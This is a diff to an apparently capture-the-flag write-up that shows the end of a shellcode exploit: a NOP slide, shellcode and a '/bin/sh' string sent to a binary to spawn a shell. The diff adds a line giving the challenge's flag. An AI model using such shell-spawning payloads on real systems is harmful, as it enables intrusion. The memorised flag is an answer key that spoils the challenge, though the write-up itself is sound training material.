@@ -133,4 +133,4 @@ shell_string = bytearray("/bin/sh", "ascii")
 
 p.send(nop_slide + shell_code + shell_string + b"\x00")
 ````
-After sending it to the binary we have a shell! You can find the full expolit in the additional files.
+After sending it to the binary we have a shell! You can find the full expolit in the additional files, run it on the remote server then use `cat flag` to get CSCG{s3lf_m0d1fy1ng_c0dez!}.
